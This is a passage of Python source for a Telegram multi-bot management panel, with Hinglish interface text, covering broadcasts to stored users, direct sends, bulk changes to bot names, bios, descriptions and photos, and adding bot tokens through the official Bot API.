            "→ ʏᴀ ᴀᴅᴅ ᴜꜱᴇʀ ꜱᴇ ɪᴅꜱ ᴅᴀᴀʟᴏ",
            reply_markup=main_kb(update.effective_user.id),
        )
        return ConversationHandler.END
    try:
        bot = Bot(token=active)
        await bot.initialize()
    except Exception as e:
        await update.message.reply_text(f"❌ {e}", reply_markup=main_kb(update.effective_user.id))
        return ConversationHandler.END

    # Pre-download media once — avoids file_id cross-bot error
    media_res = None
    plain_text = update.message.text or ""
    if not plain_text:
        try:
            media_res = await _dl_media(context, update.message)
        except Exception as e:
            await update.message.reply_text(f"❌ ᴍᴇᴅɪᴀ ᴅᴏᴡɴʟᴏᴀᴅ ꜰᴀɪʟ: {e}")
            return ConversationHandler.END

    await update.message.reply_text(
        f"📡 <b>ꜱᴇɴᴅɪɴɢ ᴛᴏ {len(users)} ᴜꜱᴇʀꜱ...</b>",
        parse_mode=ParseMode.HTML,
    )
    success = fail = 0
    failed_ids = []
    sem = asyncio.Semaphore(10)

    async def _send_one(uid):
        nonlocal success, fail
        async with sem:
            try:
                if plain_text:
                    await bot.send_message(chat_id=uid, text=plain_text)
                elif media_res and media_res[1] != "text":
                    data, mtype, cap = media_res
                    if hasattr(data, 'seek'):
                        data.seek(0)
                    elif isinstance(data, tuple) and hasattr(data[0], 'seek'):
                        data[0].seek(0)
                    await _send_media_to(bot, uid, media_res)
                else:
                    return
                success += 1
                try:
                    log_outbound(active, uid, (plain_text or "[media]")[:4000])
                except Exception:
                    pass
            except Exception:
                fail += 1
                failed_ids.append(uid)

    await asyncio.gather(*[_send_one(u) for u in users])
    try:
        await bot.shutdown()
    except Exception:
        pass
    extra = ""
    if failed_ids:
        extra = "\n❌ ꜰᴀɪʟ ɪᴅꜱ: " + ", ".join(map(str, failed_ids[:15]))
        if len(failed_ids) > 15:
            extra += f" +{len(failed_ids) - 15}"
    await update.message.reply_text(
        f"✅ <b>ʙʀᴏᴀᴅᴄᴀꜱᴛ ᴅᴏɴᴇ</b>\n"
        f"📤 ᴛᴀʀɢᴇᴛꜱ: <b>{len(users)}</b>\n"
        f"✅ ꜱᴜᴄᴄᴇꜱꜱ: <b>{success}</b>\n"
        f"❌ ꜰᴀɪʟᴇᴅ: <b>{fail}</b>{extra}",
        parse_mode=ParseMode.HTML,
        reply_markup=main_kb(update.effective_user.id),
    )
    clear_temp(context)
    return ConversationHandler.END



async def send_bot_start(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
    cancel_bg_tasks(context)
    await update.message.reply_text(
        "🤖 <b>Chat ID / User ID bhejo:</b>\n/cancel",
        parse_mode=ParseMode.HTML,
        reply_markup=back_main_kb(),
    )
    return WAIT_SEND_CHAT


async def send_bot_chat(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
    text = (update.message.text or "").strip()
    if any(x in _norm(text).upper() for x in ["VIEW", "SEND", "MAIN", "OWNER", "BACK"]):
        clear_temp(context)
        await back_main(update, context)
        return ConversationHandler.END
    context.user_data["send_chat"] = text
    await update.message.reply_text("<b>Ab text / photo / video bhejo:</b>", parse_mode=ParseMode.HTML)
    return WAIT_SEND_CONTENT


async def send_bot_content(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
    chat = context.user_data.get("send_chat")
    bot = context.bot
    token = context.user_data.get("active_token")
    if token:
        try:
            bot = Bot(token=token)
            await bot.initialize()
        except Exception:
            bot = context.bot
    try:
        target = int(chat) if str(chat).lstrip("-").isdigit() else chat
        sent_txt = (update.message.text or update.message.caption or "[media]")[:4000]
        if update.message.text:
            await bot.send_message(chat_id=target, text=update.message.text)
        else:
            media_res = await _dl_media(context, update.message)
            await _send_media_to(bot, target, media_res)
        if token:
            try:
                log_outbound(token, int(target) if str(target).lstrip("-").isdigit() else 0, sent_txt)
            except Exception:
                pass
        await update.message.reply_text("✅ Sent (ꜱᴀᴠᴇᴅ ᴛᴏ ᴠɪᴇᴡ)", reply_markup=send_kb())
    except Exception as e:
        await update.message.reply_text(f"❌ {e}", reply_markup=send_kb())
    finally:
        if token and bot != context.bot:
            try:
                await bot.shutdown()
            except Exception:
                pass
    clear_temp(context)
    return ConversationHandler.END


async def send_uid_start(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
    cancel_bg_tasks(context)
    await update.message.reply_text(
        "👤 <b>User ID bhejo:</b>\n/cancel",
        parse_mode=ParseMode.HTML,
        reply_markup=back_main_kb(),
    )
    return WAIT_SEND_UID


async def send_uid_recv(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
    text = (update.message.text or "").strip()
    if any(x in _norm(text).upper() for x in ["VIEW", "SEND", "MAIN", "OWNER", "BACK"]):
        clear_temp(context)
        await back_main(update, context)
        return ConversationHandler.END
    try:
        context.user_data["send_uid"] = int(text)
    except Exception:
        await update.message.reply_text("❌ Number")
        return WAIT_SEND_UID
    await update.message.reply_text("<b>Ab message / media bhejo:</b>", parse_mode=ParseMode.HTML)
    return WAIT_SEND_UID_CONTENT


async def send_uid_content(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
    uid = context.user_data.get("send_uid")
    bot = context.bot
    token = context.user_data.get("active_token")
    if token:
        try:
            bot = Bot(token=token)
            await bot.initialize()
        except Exception:
            pass
    try:
        if update.message.text:
            await bot.send_message(chat_id=uid, text=update.message.text)
        else:
            media_res = await _dl_media(context, update.message)
            await _send_media_to(bot, uid, media_res)
        await update.message.reply_text(
            f"✅ <b>User {uid} ko bhej diya</b>",
            parse_mode=ParseMode.HTML,
            reply_markup=main_kb(update.effective_user.id),
        )
    except Exception as e:
        await update.message.reply_text(f"❌ {e}", reply_markup=main_kb(update.effective_user.id))
    finally:
        if token and bot != context.bot:
            try:
                await bot.shutdown()
            except Exception:
                pass
    clear_temp(context)
    return ConversationHandler.END


# ================== PROFILE ==================
async def name_start(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
    cancel_bg_tasks(context)
    await update.message.reply_text(
        "✏️ <b>NAME CHANGE</b>\n\n🔄 <b>Change Single</b> — sirf selected bot ka naam\n🌐 <b>Change All</b> — sabhi bots ka naam ek saath",
        parse_mode=ParseMode.HTML, reply_markup=change_mode_kb())
    return WAIT_NAME_MODE


async def name_mode(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
    uid = update.effective_user.id
    txt = _norm(update.message.text).upper()
    if "ALL" in txt:
        await update.message.reply_text("✏️ <b>Naya naam bhejo</b> (sabhi bots ke liye):\n/cancel", parse_mode=ParseMode.HTML, reply_markup=back_main_kb())
        return WAIT_NAME_ALL
    if not context.user_data.get("active_token"):
        await update.message.reply_text("❌ <b>Pehle MY BOTS se ek bot select karo</b>", parse_mode=ParseMode.HTML, reply_markup=main_kb(uid))
        return ConversationHandler.END
    await update.message.reply_text("✏️ <b>ɴᴀʏᴀ ɴᴀᴍᴇ ʙʜᴇᴊᴏ:</b>\n/cancel", parse_mode=ParseMode.HTML, reply_markup=back_main_kb())
    return WAIT_NAME


async def name_recv(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
    bot = await get_active_bot(context)
    if not bot:
        return ConversationHandler.END
    try:
        await bot.set_my_name(name=update.message.text.strip()[:64])
        await update.message.reply_text("✅ <b>NAME CHANGE</b>", parse_mode=ParseMode.HTML, reply_markup=control_kb())
    except Exception as e:
        await update.message.reply_text(f"❌ {e}", reply_markup=control_kb())
    finally:
        await bot.shutdown()
    clear_temp(context)
    return ConversationHandler.END


async def name_recv_all(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
    new_name = update.message.text.strip()[:64]
    bots = load_data().get("ʙᴏᴛꜱ", {})
    uid = update.effective_user.id
    ok = fail = 0
    for token in list(bots.keys()):
        try:
            b = Bot(token)
            await b.set_my_name(name=new_name)
            await b.shutdown()
            ok += 1
        except Exception:
            fail += 1
    await update.message.reply_text(
        f"✅ <b>NAME CHANGE ALL</b>\n✔️ Success: {ok} bots\n❌ Failed: {fail} bots",
        parse_mode=ParseMode.HTML, reply_markup=main_kb(uid))
    clear_temp(context)
    return ConversationHandler.END


async def bio_start(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
    cancel_bg_tasks(context)
    await update.message.reply_text(
        "📝 <b>BIO CHANGE</b>\n\n🔄 <b>Change Single</b> — sirf selected bot ka bio\n🌐 <b>Change All</b> — sabhi bots ka bio ek saath",
        parse_mode=ParseMode.HTML, reply_markup=change_mode_kb())
    return WAIT_BIO_MODE


async def bio_mode(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
    uid = update.effective_user.id
    txt = _norm(update.message.text).upper()
    if "ALL" in txt:
        await update.message.reply_text("📝 <b>Naya bio bhejo</b> (sabhi bots ke liye):\n/cancel", parse_mode=ParseMode.HTML, reply_markup=back_main_kb())
        return WAIT_BIO_ALL
    if not context.user_data.get("active_token"):
        await update.message.reply_text("❌ <b>Pehle MY BOTS se ek bot select karo</b>", parse_mode=ParseMode.HTML, reply_markup=main_kb(uid))
        return ConversationHandler.END
    await update.message.reply_text("📝 <b>ɴᴀʏᴀ ʙɪᴏ ʙʜᴇᴊᴏ:</b>\n/cancel", parse_mode=ParseMode.HTML, reply_markup=back_main_kb())
    return WAIT_BIO


async def bio_recv(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
    bot = await get_active_bot(context)
    if not bot:
        return ConversationHandler.END
    try:
        await bot.set_my_short_description(short_description=update.message.text.strip()[:120])
        await update.message.reply_text("✅ <b>BIO CHANGE</b>", parse_mode=ParseMode.HTML, reply_markup=control_kb())
    except Exception as e:
        await update.message.reply_text(f"❌ {e}", reply_markup=control_kb())
    finally:
        await bot.shutdown()
    clear_temp(context)
    return ConversationHandler.END


async def bio_recv_all(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
    new_bio = update.message.text.strip()[:120]
    bots = load_data().get("ʙᴏᴛꜱ", {})
    uid = update.effective_user.id
    ok = fail = 0
    for token in list(bots.keys()):
        try:
            b = Bot(token)
            await b.set_my_short_description(short_description=new_bio)
            await b.shutdown()
            ok += 1
        except Exception:
            fail += 1
    await update.message.reply_text(
        f"✅ <b>BIO CHANGE ALL</b>\n✔️ Success: {ok} bots\n❌ Failed: {fail} bots",
        parse_mode=ParseMode.HTML, reply_markup=main_kb(uid))
    clear_temp(context)
    return ConversationHandler.END


async def desc_start(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
    cancel_bg_tasks(context)
    if not context.user_data.get("active_token"):
        await update.message.reply_text("❌ ᴘᴇʜʟᴇ ʙᴏᴛ ꜱᴇʟᴇᴄᴛ ᴋᴀʀᴏ", reply_markup=main_kb(update.effective_user.id))
        return ConversationHandler.END
    await update.message.reply_text("📄 <b>ɴᴀʏᴀ ᴅᴇꜱᴄʀɪᴘᴛɪᴏɴ ʙʜᴇᴊᴏ:</b>\n/cancel", parse_mode=ParseMode.HTML, reply_markup=back_main_kb())
    return WAIT_DESC


async def desc_recv(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
    bot = await get_active_bot(context)
    if not bot:
        return ConversationHandler.END
    try:
        await bot.set_my_description(description=update.message.text.strip()[:512])
        await update.message.reply_text("✅ <b>DESC CHANGE</b>", parse_mode=ParseMode.HTML, reply_markup=control_kb())
    except Exception as e:
        await update.message.reply_text(f"❌ {e}", reply_markup=control_kb())
    finally:
        await bot.shutdown()
    clear_temp(context)
    return ConversationHandler.END


async def photo_start(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
    cancel_bg_tasks(context)
    await update.message.reply_text(
        "🖼️ <b>PHOTO CHANGE</b>\n\n🔄 <b>Change Single</b> — sirf selected bot ki photo\n🌐 <b>Change All</b> — sabhi bots ki photo ek saath",
        parse_mode=ParseMode.HTML, reply_markup=change_mode_kb())
    return WAIT_PHOTO_MODE


async def photo_mode(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
    uid = update.effective_user.id
    txt = _norm(update.message.text).upper()
    if "ALL" in txt:
        context.user_data["_photo_all"] = True
        await update.message.reply_text("🖼️ <b>ᴘʜᴏᴛᴏ ʙʜᴇᴊᴏ</b> (sabhi bots ke liye):\n/cancel", parse_mode=ParseMode.HTML, reply_markup=back_main_kb())
        return WAIT_PHOTO
    if not context.user_data.get("active_token"):
        await update.message.reply_text("❌ <b>Pehle MY BOTS se ek bot select karo</b>", parse_mode=ParseMode.HTML, reply_markup=main_kb(uid))
        return ConversationHandler.END
    context.user_data["_photo_all"] = False
    await update.message.reply_text("🖼️ <b>ᴘʜᴏᴛᴏ ʙʜᴇᴊᴏ:</b>\n/cancel", parse_mode=ParseMode.HTML, reply_markup=back_main_kb())
    return WAIT_PHOTO


async def _set_photo_for_token(token: str, data: bytes) -> bool:
    """Set profile photo for a single token via raw API. Returns True on success."""
    import httpx as _hx
    async with _hx.AsyncClient() as cl:
        r = await cl.post(
            f"https://api.telegram.org/bot{token}/setMyProfilePhoto",
            data={"photo": json.dumps({"type": "static", "photo": "attach://img"})},
            files={"img": ("profile.jpg", data, "image/jpeg")},
            timeout=30,
        )
    return r.json().get("ok", False)


async def photo_recv(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
    if not update.message.photo:
        await update.message.reply_text("❌ Photo bhejo")
        return WAIT_PHOTO
    uid = update.effective_user.id
    photo_all = context.user_data.get("_photo_all", False)

    f = await context.bot.get_file(update.message.photo[-1].file_id)
    img_data = bytes(await f.download_as_bytearray())

    if photo_all:
        # Change All — no active bot required, iterate everything
        bots_data = load_data().get("ʙᴏᴛꜱ", {})
        if not bots_data:
            await update.message.reply_text("❌ <b>Koi bot saved nahi hai</b>", parse_mode=ParseMode.HTML, reply_markup=main_kb(uid))
            return ConversationHandler.END
        prog = await update.message.reply_text(f"⏳ <b>{len(bots_data)} ʙᴏᴛꜱ ᴋɪ ᴘʜᴏᴛᴏ ᴄʜᴀɴɢᴇ ʜᴏ ʀᴀʜɪ ʜᴀɪ…</b>", parse_mode=ParseMode.HTML)
        ok = fail = 0
        for token in list(bots_data.keys()):
            try:
                if await _set_photo_for_token(token, img_data):
                    ok += 1
                else:
                    fail += 1
            except Exception:
                fail += 1
        try:
            await prog.edit_text(
                f"✅ <b>ᴘʜᴏᴛᴏ ᴄʜᴀɴɢᴇ ᴀʟʟ</b> ᴄᴏᴍᴘʟᴇᴛᴇ\n✔️ ꜱᴜᴄᴄᴇꜱꜱ: <b>{ok}</b>  ❌ ꜰᴀɪʟ: <b>{fail}</b>",
                parse_mode=ParseMode.HTML)
        except Exception:
            pass
        await update.message.reply_text("ᴍᴀɪɴ ᴍᴇɴᴜ", reply_markup=main_kb(uid))
        context.user_data.pop("_photo_all", None)
        return ConversationHandler.END

    # Single mode — need active bot
    bot = await get_active_bot(context)
    if not bot:
        return ConversationHandler.END
    try:
        photo_set = await _set_photo_for_token(bot.token, img_data)
        if photo_set:
            await update.message.reply_text("✅ <b>ᴘʜᴏᴛᴏ ᴄʜᴀɴɢᴇ ✨</b>", parse_mode=ParseMode.HTML, reply_markup=control_kb())
        else:
            await update.message.reply_text("⚠️ ᴘʜᴏᴛᴏ ꜱᴇᴛ ɴᴀʜɪ ʜᴜᴀ\nBotFather /setuserpic ꜱᴇ ᴛʀʏ ᴋᴀʀᴏ", reply_markup=control_kb())
    except Exception as e:
        await update.message.reply_text(f"❌ {e}", reply_markup=control_kb())
    finally:
        await bot.shutdown()
    context.user_data.pop("_photo_all", None)
    clear_temp(context)
    return ConversationHandler.END


# ================== PROFILE TEXT MANAGER ==================

_PROFILE_EXIT_BUTTONS = {
    "MY BOTS","VIEW MESSAGES","SEND MESSAGE","BROADCAST","CHANGE NAME",
    "CHANGE BIO","CHANGE DESC","CHANGE PHOTO","ALL USERS","OWNER PANEL",
    "BACK","PROFILE TEXT","BROADCAST FILE","BROADCAST ADDED","SERVER STATUS",
    "ADD BOT TOKEN","REMOVE BOT","ADD ADMIN","REMOVE ADMIN","ADMIN LIST",
    "MAIN MENU","CANCEL",
}

async def profile_text_start(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
    if not is_owner(update.effective_user.id):
        await update.message.reply_text("❌ ꜱɪʀꜰ ᴏᴡɴᴇʀ ᴋᴇ ʟɪʏᴇ")
        return ConversationHandler.END
    cancel_bg_tasks(context)
    uid = update.effective_user.id
    # Auto-use active selected bot if available
    active = context.user_data.get("active_token") or context.user_data.get("_profile_token")
    if active and not context.user_data.get("_profile_token"):
        try:
            b = Bot(token=active)
            me = await b.get_me()
            await b.shutdown()
            context.user_data["_profile_token"]        = active
            context.user_data["_profile_bot_name"]     = me.first_name
            context.user_data["_profile_bot_username"] = me.username or str(me.id)
        except Exception:
            active = None
    tok_info = (f"\n\n✅ <b>Selected Bot:</b> @{context.user_data.get('_profile_bot_username','?')}"
                if context.user_data.get("_profile_token")
                else "\n\n🔑 Pehle <b>Enter Bot Token</b> press karo")
    await update.message.reply_text(
        f"📝 <b>ʙᴏᴛ ᴘʀᴏꜰɪʟᴇ ᴛᴇxᴛ ᴍᴀɴᴀɢᴇʀ</b>{tok_info}\n\n"
        "ℹ️ <i>Description / Short Description change ya remove karo kisi bhi bot ka.</i>",
        parse_mode=ParseMode.HTML, reply_markup=profile_action_kb())
    return WAIT_PROFILE_ACTION


# ── Raw API helpers — zero PTB version dependency ────────────────────────────
async def _tg_post(token: str, method: str, payload: dict) -> dict:
    """Direct Telegram Bot API POST. Returns parsed JSON."""
    import httpx as _hx
    async with _hx.AsyncClient() as cl:
        r = await cl.post(
            f"https://api.telegram.org/bot{token}/{method}",
            json=payload, timeout=20)
    return r.json()

async def _set_desc(token: str, text: str) -> dict:
    return await _tg_post(token, "setMyDescription",      {"description":       text})

async def _set_short(token: str, text: str) -> dict:
    return await _tg_post(token, "setMyShortDescription", {"short_description":  text})

async def _get_desc(token: str) -> tuple:
    """Returns (description, short_description) strings."""
    d = await _tg_post(token, "getMyDescription",      {})
    s = await _tg_post(token, "getMyShortDescription", {})
    desc  = (d.get("result") or {}).get("description",       "") or ""
    short = (s.get("result") or {}).get("short_description", "") or ""
    return desc, short


async def profile_action_handler(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
    uid  = update.effective_user.id
    t    = _norm(update.message.text).upper()
    tok  = context.user_data.get("_profile_token")

    # Exit on any main-menu navigation
    for nav in _PROFILE_EXIT_BUTTONS:
        if nav in t:
            context.user_data.pop("_profile_token",        None)
            context.user_data.pop("_profile_bot_name",     None)
            context.user_data.pop("_profile_bot_username", None)
            await update.message.reply_text("↩️", reply_markup=main_kb(uid))
            return ConversationHandler.END

    async def _need_token():
        await update.message.reply_text(
            "❌ <b>Pehle 🔑 Enter Bot Token press karo</b>",
            parse_mode=ParseMode.HTML, reply_markup=profile_action_kb())

    if "ENTER" in t and "TOKEN" in t:
        await update.message.reply_text(
            "🔑 <b>Bot Token bhejo:</b>\n<i>Message delete ho jaayega</i>\n/cancel",
            parse_mode=ParseMode.HTML, reply_markup=back_main_kb())
        return WAIT_PROFILE_TOKEN

    if "CHECK" in t or "CURRENT" in t:
        if not tok: await _need_token(); return WAIT_PROFILE_ACTION
        try:
            desc, short = await _get_desc(tok)
            uname = context.user_data.get("_profile_bot_username", "?")
            await update.message.reply_text(
                f"🔍 <b>@{uname} ᴄᴜʀʀᴇɴᴛ ᴛᴇxᴛ</b>\n\n"
                f"📝 <b>Description</b> <i>(Telegram mein 'Description' field):</i>\n"
                f"<code>{desc or '(empty)'}</code>\n\n"
                f"✏️ <b>About / Bio</b> <i>(Telegram mein 'About' field):</i>\n"
                f"<code>{short or '(empty)'}</code>\n\n"
                "ℹ️ <i>'HOSTED VIA @vpshostingbot' → description mein hai to Change Description se replace karo. "
                "Kisi aur jagah dikh raha hai → Bot API se nahi hata sakta.</i>",
                parse_mode=ParseMode.HTML, reply_markup=profile_action_kb())
        except Exception as e:
            await update.message.reply_text(f"❌ {e}", reply_markup=profile_action_kb())
        return WAIT_PROFILE_ACTION

    if "ALL" in t and "SHORT" not in t and "DESCRIPTION" in t:
        await update.message.reply_text(
            "📝 <b>Naya Description bhejo</b> — <b>SABHI bots</b> pe apply:\n"
            "<i>(Telegram mein 'Description' field — bot info mein neeche dikhta hai)</i>\n/cancel",
            parse_mode=ParseMode.HTML, reply_markup=back_main_kb())
        return WAIT_PROFILE_DESC_ALL

    if "ALL" in t and ("SHORT" in t or "ABOUT" in t):
        await update.message.reply_text(
            "✏️ <b>Naya About/Bio bhejo</b> — <b>SABHI bots</b> pe apply:\n"
            "<i>(Telegram mein 'About' field — profile mein naam ke neeche dikhta hai)</i>\n/cancel",
            parse_mode=ParseMode.HTML, reply_markup=back_main_kb())
        return WAIT_PROFILE_SHORT_ALL

    if "CHANGE DESCRIPTION" in t and "SHORT" not in t and "ALL" not in t:
        if not tok: await _need_token(); return WAIT_PROFILE_ACTION
        await update.message.reply_text(
            "📝 <b>Naya Description bhejo</b> (max 512 chars):\n"
            "<i>Telegram → bot info mein neeche wala text</i>\n"
            "<i>Khaali message bhejo → remove hoga</i>\n/cancel",
            parse_mode=ParseMode.HTML, reply_markup=back_main_kb())
        return WAIT_PROFILE_DESC

    if ("SHORT" in t or "ABOUT" in t) and "CHANGE" in t and "ALL" not in t:
        if not tok: await _need_token(); return WAIT_PROFILE_ACTION
        await update.message.reply_text(
            "✏️ <b>Naya About/Bio bhejo</b> (max 120 chars):\n"
            "<i>Telegram → profile mein naam ke neeche wala text</i>\n"
            "<i>Khaali message bhejo → remove hoga</i>\n/cancel",
            parse_mode=ParseMode.HTML, reply_markup=back_main_kb())
        return WAIT_PROFILE_SHORT

    if "REMOVE" in t:
        if not tok: await _need_token(); return WAIT_PROFILE_ACTION
        try:
            r1 = await _set_desc( tok, "")
            r2 = await _set_short(tok, "")
            uname = context.user_data.get("_profile_bot_username","?")
            if r1.get("ok") and r2.get("ok"):
                await update.message.reply_text(
                    f"✅ <b>@{uname} ᴅᴇꜱᴄ + ᴀʙᴏᴜᴛ ᴅᴏɴᴏ ʜᴀᴛᴀ ᴅɪʏᴇ</b>",
                    parse_mode=ParseMode.HTML, reply_markup=profile_action_kb())
            else:
                err = r1.get("description","") or r2.get("description","")
                await update.message.reply_text(f"⚠️ {err}", reply_markup=profile_action_kb())
        except Exception as e:
            await update.message.reply_text(f"❌ {e}", reply_markup=profile_action_kb())
        return WAIT_PROFILE_ACTION

    await update.message.reply_text("👇 Action chuno:", reply_markup=profile_action_kb())
    return WAIT_PROFILE_ACTION


async def profile_token_recv(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
    raw = (update.message.text or "").strip()
    try:
        await update.message.delete()
    except Exception:
        pass
    tokens = extract_bot_tokens(raw)
    if not tokens:
        await update.message.reply_text(
            "❌ Valid token nahi mila.\nFormat: <code>1234567890:ABCDEFabcdef…</code>\n/cancel",
            parse_mode=ParseMode.HTML)
        return WAIT_PROFILE_TOKEN
    tok = tokens[0]
    try:
        r = await _tg_post(tok, "getMe", {})
        if not r.get("ok"):
            raise Exception(r.get("description", "getMe failed"))
        me = r["result"]
        context.user_data["_profile_token"]        = tok
        context.user_data["_profile_bot_name"]     = me.get("first_name","?")
        context.user_data["_profile_bot_username"] = me.get("username","") or str(me.get("id","?"))
        await update.message.reply_text(
            f"✅ <b>ᴛᴏᴋᴇɴ ᴠᴇʀɪꜰɪᴇᴅ!</b>\n"
            f"🤖 ɴᴀᴍᴇ: <b>{me.get('first_name','?')}</b>\n"
            f"📛 ᴜꜱᴇʀɴᴀᴍᴇ: @{me.get('username','?')}\n\n"
            "Ab neeche se action chuno 👇",
            parse_mode=ParseMode.HTML, reply_markup=profile_action_kb())
        return WAIT_PROFILE_ACTION
    except Exception as e:
        await update.message.reply_text(
            f"❌ Token invalid:\n<code>{e}</code>\nDobara bhejo ya /cancel",
            parse_mode=ParseMode.HTML)
        return WAIT_PROFILE_TOKEN


async def profile_desc_recv(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
    tok  = context.user_data.get("_profile_token")
    text = (update.message.text or "").strip()[:512]
    r    = await _set_desc(tok, text)
    if r.get("ok"):
        await update.message.reply_text(
            f"✅ <b>ᴅᴇꜱᴄʀɪᴘᴛɪᴏɴ ᴜᴘᴅᴀᴛᴇᴅ!</b>\n📝 {text or '(ʜᴀᴛᴀ ᴅɪ)'}",
            parse_mode=ParseMode.HTML, reply_markup=profile_action_kb())
    else:
        await update.message.reply_text(
            f"❌ <b>Failed:</b> {r.get('description','unknown error')}",
            parse_mode=ParseMode.HTML, reply_markup=profile_action_kb())
    return WAIT_PROFILE_ACTION


async def profile_short_recv(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
    tok  = context.user_data.get("_profile_token")
    text = (update.message.text or "").strip()[:120]
    r    = await _set_short(tok, text)
    if r.get("ok"):
        await update.message.reply_text(
            f"✅ <b>ᴀʙᴏᴜᴛ/ʙɪᴏ ᴜᴘᴅᴀᴛᴇᴅ!</b>\n✏️ {text or '(ʜᴀᴛᴀ ᴅɪ)'}",
            parse_mode=ParseMode.HTML, reply_markup=profile_action_kb())
    else:
        await update.message.reply_text(
            f"❌ <b>Failed:</b> {r.get('description','unknown error')}",
            parse_mode=ParseMode.HTML, reply_markup=profile_action_kb())
    return WAIT_PROFILE_ACTION


async def profile_desc_all_recv(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
    text = (update.message.text or "").strip()[:512]
    bots = load_data().get("ʙᴏᴛꜱ", {})
    if not bots:
        await update.message.reply_text("❌ Koi bot saved nahi", reply_markup=profile_action_kb())
        return WAIT_PROFILE_ACTION
    prog = await update.message.reply_text(
        f"⏳ <b>{len(bots)} ʙᴏᴛꜱ ᴋɪ ᴅᴇꜱᴄ ᴄʜᴀɴɢᴇ…</b>", parse_mode=ParseMode.HTML)
    ok = fail = 0
    for token in list(bots.keys()):
        r = await _set_desc(token, text)
        if r.get("ok"): ok += 1
        else: fail += 1
    try:
        await prog.edit_text(
            f"✅ <b>ᴀʟʟ ᴅᴇꜱᴄʀɪᴘᴛɪᴏɴ ᴜᴘᴅᴀᴛᴇᴅ</b>\n✔️ {ok}  ❌ {fail}",
            parse_mode=ParseMode.HTML)
    except Exception:
        pass
    await update.message.reply_text("👇 Aur kya karna hai?", reply_markup=profile_action_kb())
    return WAIT_PROFILE_ACTION


async def profile_short_all_recv(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
    text = (update.message.text or "").strip()[:120]
    bots = load_data().get("ʙᴏᴛꜱ", {})
    if not bots:
        await update.message.reply_text("❌ Koi bot saved nahi", reply_markup=profile_action_kb())
        return WAIT_PROFILE_ACTION
    prog = await update.message.reply_text(
        f"⏳ <b>{len(bots)} ʙᴏᴛꜱ ᴋɪ ᴀʙᴏᴜᴛ/ʙɪᴏ ᴄʜᴀɴɢᴇ…</b>", parse_mode=ParseMode.HTML)
    ok = fail = 0
    for token in list(bots.keys()):
        r = await _set_short(token, text)
        if r.get("ok"): ok += 1
        else: fail += 1
    try:
        await prog.edit_text(
            f"✅ <b>ᴀʟʟ ᴀʙᴏᴜᴛ/ʙɪᴏ ᴜᴘᴅᴀᴛᴇᴅ</b>\n✔️ {ok}  ❌ {fail}",
            parse_mode=ParseMode.HTML)
    except Exception:
        pass
    await update.message.reply_text("👇 Aur kya karna hai?", reply_markup=profile_action_kb())
    return WAIT_PROFILE_ACTION


# ================== OWNER ==================
async def owner_panel(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not is_admin(update.effective_user.id):
        await update.message.reply_text("❌ <b>Sirf Owner / Admin</b>", parse_mode=ParseMode.HTML)
        return
    cancel_bg_tasks(context)
    context.user_data["_prev"] = "main"
    data = load_data()
    await update.message.reply_text(
        f"👑 <b>OWNER PANEL</b>\n\n"
        f"🤖 ʙᴏᴛꜱ: <b>{len(data.get('ʙᴏᴛꜱ', {}))}</b>\n"
        f"👥 ᴀᴅᴍɪɴꜱ: <b>{len(data.get('ᴀᴅᴍɪɴꜱ', []))}</b>",
        parse_mode=ParseMode.HTML,
        reply_markup=owner_kb(update.effective_user.id if update and update.effective_user else 0),
    )


async def add_token_start(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
    if not is_owner(update.effective_user.id):
        await update.message.reply_text("❌ ꜱɪʀꜰ ᴏᴡɴᴇʀ")
        return ConversationHandler.END
    cancel_bg_tasks(context)
    await update.message.reply_text(
        "🤖 <b>BOT TOKEN ADD</b>\n\n"
        "Ek token ya 100 tokens ek saath bhejo.\n"
        "Format: ek line me ek token\n\n"
        "<code>1234567890:AABB...\n"
        "9876543210:XXYY...\n"
        "...</code>\n\n"
        "/cancel",
        parse_mode=ParseMode.HTML,
        reply_markup=back_main_kb(),
    )
    return WAIT_ADD_TOKEN


async def add_token_recv(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
    text = update.message.text or ""
    # Extract ALL tokens from the message (supports 1 to 100+)
    tokens = list(set(_TOKEN_RE.findall(text)))
    if not tokens:
        await update.message.reply_text(
            "❌ Koi valid token nahi mila.\n"
            "Format: <code>1234567890:ABCDEFabcdef...</code>\n"
            "Dobara try karo ya /cancel",
            parse_mode=ParseMode.HTML,
        )
        return WAIT_ADD_TOKEN

    progress = await update.message.reply_text(
        f"⏳ <b>{len(tokens)} token(s) validate ho rahe hain...</b>",
        parse_mode=ParseMode.HTML,
    )

    added = []
    failed  = []
    data    = load_data()
    data.setdefault("ʙᴏᴛꜱ", {})
    # If user is a registered clone owner, store in their own namespace
    uid_str = str(update.effective_user.id)
    is_clone_owner = uid_str in data.get("clones", {})
    if is_clone_owner:
        data.setdefault("clone_bots", {})
        data["clone_bots"].setdefault(uid_str, {})
        store_target = data["clone_bots"][uid_str]
    else:
        store_target = data["ʙᴏᴛꜱ"]

    for tok in tokens:
        try:
            b = Bot(token=tok)
            await b.initialize()
            me = await b.get_me()
            await b.shutdown()
            store_target[tok] = {
